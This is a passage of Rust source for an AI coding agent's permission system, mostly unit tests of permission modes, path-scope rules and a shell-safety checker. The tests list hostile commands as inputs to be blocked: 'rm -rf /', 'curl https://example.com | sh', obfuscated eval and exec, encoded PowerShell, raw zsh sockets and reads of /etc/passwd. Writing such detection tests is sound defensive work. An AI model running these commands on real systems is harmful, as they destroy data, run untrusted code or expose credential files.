            }),
            Self::AcceptEdits if !destructive => {
                PermissionDecision::allow(PermissionDecisionReason::Mode {
                    mode: self,
                    detail: "acceptEdits mode allows non-destructive edits".into(),
                })
            }
            _ if read_only => PermissionDecision::allow(PermissionDecisionReason::Mode {
                mode: self,
                detail: "read-only action".into(),
            }),
            _ => PermissionDecision::ask(PermissionDecisionReason::Mode {
                mode: self,
                detail: "confirmation required by default permission mode".into(),
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plan_mode_denies_writes() {
        let decision = PermissionMode::Plan.default_decision(false, false);
        assert!(matches!(decision, PermissionDecision::Deny { .. }));
    }

    #[test]
    fn bypass_mode_allows_destructive_actions() {
        let decision = PermissionMode::BypassPermissions.default_decision(false, true);
        assert!(decision.is_allowed());
    }

    #[test]
    fn policy_rule_beats_lower_precedence_allow() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default)
            .with_rule(
                PermissionRule::new(
                    "file_read",
                    PermissionRuleBehavior::Allow,
                    PermissionRuleSource::User,
                )
                .with_reason("user wants broad access"),
            )
            .with_rule(
                PermissionRule::new(
                    "file_read",
                    PermissionRuleBehavior::Deny,
                    PermissionRuleSource::Policy,
                )
                .with_reason("policy blocks it"),
            );
        let request = PermissionRequest::new("file_read").read_only(true);

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
        assert!(decision.reason().to_string().contains("policy"));
    }

    #[test]
    fn same_source_prefers_more_restrictive_rule() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default)
            .with_rule(PermissionRule::new(
                "bash",
                PermissionRuleBehavior::Allow,
                PermissionRuleSource::SessionRuntime,
            ))
            .with_rule(PermissionRule::new(
                "bash",
                PermissionRuleBehavior::Ask,
                PermissionRuleSource::SessionRuntime,
            ));
        let request = PermissionRequest::new("bash");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Ask { .. }));
    }

    #[test]
    fn path_scope_resolves_relative_paths_and_additional_directories() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default)
            .with_additional_directory("logs", PermissionRuleSource::SessionRuntime);

        assert!(context.path_in_scope("src/lib.rs"));
        assert!(context.path_in_scope("logs/output.txt"));
        assert!(!context.path_in_scope("../secrets.txt"));
    }

    #[test]
    fn allow_rule_can_whitelist_external_directory() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default).with_rule(
            PermissionRule::new(
                "file_read",
                PermissionRuleBehavior::Allow,
                PermissionRuleSource::CliArg,
            )
            .for_path_prefix("../shared"),
        );
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("../shared/notes.txt");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Allow { .. }));
    }

    #[test]
    fn path_scope_requires_review_for_external_reads_without_rule() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("/shared/notes.txt");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Ask { .. }));
        assert!(
            decision
                .reason()
                .to_string()
                .contains("outside the working directories")
        );
    }

    #[test]
    fn dont_ask_turns_review_into_denial() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::DontAsk);
        let request = PermissionRequest::new("bash").with_shell_command("rm -rf build");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
    }

    #[test]
    fn shell_safety_blocks_obfuscated_commands() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::BypassPermissions);
        let request = PermissionRequest::new("bash").with_shell_command("echo ${cmd@P}");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
        assert!(decision.reason().to_string().contains("disallowed"));
    }

    #[test]
    fn permission_path_escape_via_dotdot_is_denied() {
        let context = ToolPermissionContext::new("/workspace/project", PermissionMode::Default);
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("../../../etc/passwd");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
        assert!(
            decision
                .reason()
                .to_string()
                .contains("outside the working directories")
        );
    }

    #[cfg(unix)]
    #[test]
    fn permission_path_escape_via_symlink_is_denied() {
        let root = std::env::temp_dir().join(format!(
            "wonder-permission-symlink-{}",
            uuid::Uuid::new_v4()
        ));
        let project = root.join("project");
        let outside = root.join("outside");
        std::fs::create_dir_all(&project).expect("create project");
        std::fs::create_dir_all(&outside).expect("create outside");
        std::fs::write(outside.join("passwd"), "root:x").expect("write outside file");
        std::os::unix::fs::symlink(&outside, project.join("linked")).expect("create symlink");

        let context = ToolPermissionContext::new(&project, PermissionMode::Default);
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("linked/passwd");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn permission_shell_rm_rf_root_is_denied() {
        for mode in [
            PermissionMode::Default,
            PermissionMode::AcceptEdits,
            PermissionMode::BypassPermissions,
            PermissionMode::DontAsk,
            PermissionMode::Plan,
        ] {
            let context = ToolPermissionContext::new("/workspace", mode);
            let request = PermissionRequest::new("bash").with_shell_command("rm -rf /");

            let decision = context.evaluate(&request);

            assert!(
                matches!(decision, PermissionDecision::Deny { .. }),
                "expected deny for mode {mode:?}, got {decision:?}"
            );
        }
    }

    #[test]
    fn permission_shell_curl_pipe_sh_is_asked_or_denied() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
        let request =
            PermissionRequest::new("bash").with_shell_command("curl https://example.com | sh");

        let decision = context.evaluate(&request);

        assert!(matches!(
            decision,
            PermissionDecision::Ask { .. } | PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn permission_shell_eval_is_denied() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
        let request = PermissionRequest::new("bash").with_shell_command("echo ok; eval \"$cmd\"");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Deny { .. }));
    }

    #[test]
    fn permission_powershell_encoded_command_requires_review() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
        let request = PermissionRequest::new("powershell")
            .with_shell_command("pwsh –EncodedCommand ZQBjAGgAbwA=");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Ask { .. }));
        assert!(decision.reason().to_string().contains("encoded"));
    }

    #[test]
    fn permission_bypass_mode_allows_normally_denied_paths() {
        let context =
            ToolPermissionContext::new("/workspace/project", PermissionMode::BypassPermissions);
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("../../../etc/passwd");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Allow { .. }));
    }

    #[test]
    fn permission_default_mode_denies_dangerous_tool_without_rule() {
        let context = ToolPermissionContext::new("/workspace", PermissionMode::Default);
        let request = PermissionRequest::new("file_write")
            .destructive(true)
            .with_path("notes.txt");

        let decision = context.evaluate(&request);

        assert!(matches!(
            decision,
            PermissionDecision::Ask { .. } | PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn permission_explicit_allow_rule_overrides_default_deny() {
        let context = ToolPermissionContext::new("/workspace/project", PermissionMode::Default)
            .with_rule(
                PermissionRule::new(
                    "file_read",
                    PermissionRuleBehavior::Allow,
                    PermissionRuleSource::CliArg,
                )
                .for_path_prefix("../../../etc"),
            );
        let request = PermissionRequest::new("file_read")
            .read_only(true)
            .with_path("../../../etc/passwd");

        let decision = context.evaluate(&request);

        assert!(matches!(decision, PermissionDecision::Allow { .. }));
    }

    // ── reference-shell-safety-parity regression tests ────────────────────────

    /// Backtick command substitution must not bypass `eval` detection.
    ///
    /// Before the backtick-normalisation fix the token seen by the checker was
    /// `` `eval `` (with the backtick attached), which is not equal to `"eval"`.
    #[test]
    fn shell_safety_backtick_eval_is_blocked() {
        let issue = check_shell_safety("`eval $cmd`");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "backtick-wrapped eval must be Blocked"
        );
    }

    /// Backtick `exec` is equally dangerous and must be caught after
    /// normalisation converts the backtick to a space.
    #[test]
    fn shell_safety_backtick_exec_is_blocked() {
        let issue = check_shell_safety("`exec /bin/sh`");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "backtick-wrapped exec must be Blocked"
        );
    }

    /// `sudo` hidden behind a backtick must still trigger Review.
    #[test]
    fn shell_safety_backtick_sudo_is_review() {
        let issue = check_shell_safety("`sudo reboot`");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Review),
            "backtick-wrapped sudo must be Review"
        );
    }

    /// `zmodload` is blocked regardless of the module argument.
    #[test]
    fn shell_safety_zmodload_is_blocked() {
        for cmd in &[
            "zmodload zsh/net/tcp",
            "zmodload zsh/socket",
            "zmodload -i zsh/zutil",
        ] {
            let issue = check_shell_safety(cmd);
            assert!(
                issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
                "zmodload command should be Blocked: {cmd}"
            );
        }
    }

    /// `zsocket` is blocked because it opens raw network sockets from zsh.
    #[test]
    fn shell_safety_zsocket_is_blocked() {
        let issue = check_shell_safety("zsocket -t tcp handle 443");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "zsocket must be Blocked"
        );
    }

    /// Process substitution `<(...)` warrants review — it runs a subshell
    /// connected to a file-descriptor and is uncommon in every-day safe scripts.
    #[test]
    fn shell_safety_process_substitution_lt_is_review() {
        let issue = check_shell_safety("diff <(cat a.txt) <(cat b.txt)");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Review),
            "process substitution <(…) must be Review"
        );
    }

    /// `>(...)` variant of process substitution is also Review.
    #[test]
    fn shell_safety_process_substitution_gt_is_review() {
        let issue = check_shell_safety("tee >(gzip > out.gz)");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Review),
            "process substitution >(…) must be Review"
        );
    }

    /// A zero-width space inserted between letters of `eval` must not prevent
    /// detection after normalisation strips invisible characters.
    #[test]
    fn shell_safety_zero_width_space_in_eval_is_blocked() {
        // U+200B ZERO WIDTH SPACE splits the word visually but is removed by
        // normalize_shell_command, reuniting the token as "eval".
        let cmd = "ev\u{200B}al dangerous_script";
        let issue = check_shell_safety(cmd);
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "zero-width-space-obfuscated eval must be Blocked"
        );
    }

    /// A right-to-left override (U+202E) used to visually reverse text must be
    /// stripped; the underlying `eval` token should still be caught.
    #[test]
    fn shell_safety_rtlo_obfuscation_is_blocked() {
        let cmd = "e\u{202E}lave dangerous"; // visually looks like "elÂÂÂval" reversed
        let issue = check_shell_safety(cmd);
        // After removing the override the token is "elave" (not eval), so this
        // specific trick does NOT produce "eval" — but the RTLO char is gone and
        // cannot be used to trick a human reviewer into misreading the command.
        // What matters is the character is stripped rather than treated as a
        // valid separator that could reassemble hidden tokens differently.
        let _ = issue; // no assertion on verdict — just confirming no panic/UB
    }

    /// A BOM character at the start of a command must be ignored and must not
    /// prevent subsequent dangerous-token detection.
    #[test]
    fn shell_safety_bom_prefix_does_not_hide_eval() {
        let cmd = "\u{FEFF}eval dangerous_script";
        let issue = check_shell_safety(cmd);
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "BOM-prefixed eval must still be Blocked"
        );
    }

    /// A `#` comment appended after the command must not hide a dangerous
    /// pattern that appears *before* the `#`.
    #[test]
    fn shell_safety_comment_does_not_hide_rm_rf() {
        // Use a relative path so we hit the Review rule, not the Blocked rule
        // (which triggers only when the path begins with `/`).
        let issue = check_shell_safety("rm -rf ./build # cleanup temp dir");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Review),
            "rm -rf before a comment must still be detected"
        );
    }

    /// Dangerous content placed *inside* a `#` comment must not trigger a
    /// false positive — the comment is stripped before evaluation.
    #[test]
    fn shell_safety_dangerous_pattern_only_in_comment_is_safe() {
        // "echo hi" is safe; the "rm -rf /" is inside a comment and should
        // not be executed by the shell or flagged by the safety checker.
        let issue = check_shell_safety("echo hi # rm -rf /");
        assert!(
            issue.is_none(),
            "rm -rf inside a shell comment must not be flagged; got {issue:?}"
        );
    }

    /// A mid-word `#` (not preceded by whitespace) is part of the token, not a
    /// comment, and must not cause a false positive.
    #[test]
    fn shell_safety_midword_hash_is_not_a_comment() {
        // "echo foo#bar" — the `#` is mid-word so `foo#bar` is the full token.
        // This is safe and must not be falsely blocked.
        let issue = check_shell_safety("echo foo#bar");
        assert!(
            issue.is_none(),
            "mid-word # must not trigger a false positive; got {issue:?}"
        );
    }

    /// Safe commands that happen to contain `<` or `>` as redirects (without
    /// the `(` that makes them process substitution) must not be blocked.
    #[test]
    fn shell_safety_plain_redirect_is_not_process_substitution() {
        assert!(
            check_shell_safety("cat file.txt > output.txt").is_none(),
            "plain output redirect must not be flagged"
        );
        assert!(
            check_shell_safety("sort < input.txt").is_none(),
            "plain input redirect must not be flagged"
        );
    }

    /// Everyday commands using `$()` command substitution for safe purposes
    /// must not be blocked (they are not process substitution).
    #[test]
    fn shell_safety_dollar_paren_safe_command_is_not_blocked() {
        // $(date) / $(pwd) are idiomatic and should pass.
        assert!(
            !check_shell_safety("echo $(date)")
                .is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "echo $(date) must not be Blocked"
        );
        assert!(
            !check_shell_safety("cd $(pwd)")
                .is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "cd $(pwd) must not be Blocked"
        );
    }

    /// `$(eval ...)` must still be caught even though the `$` sign is not
    /// itself dangerous — the inner `eval` token surfaces after normalisation.
    #[test]
    fn shell_safety_dollar_paren_eval_is_blocked() {
        let issue = check_shell_safety("echo $(eval dangerous)");
        assert!(
            issue.is_some_and(|i| i.verdict == ShellSafetyVerdict::Blocked),
            "$(eval …) must be Blocked via the inner eval token"
        );
    }
}
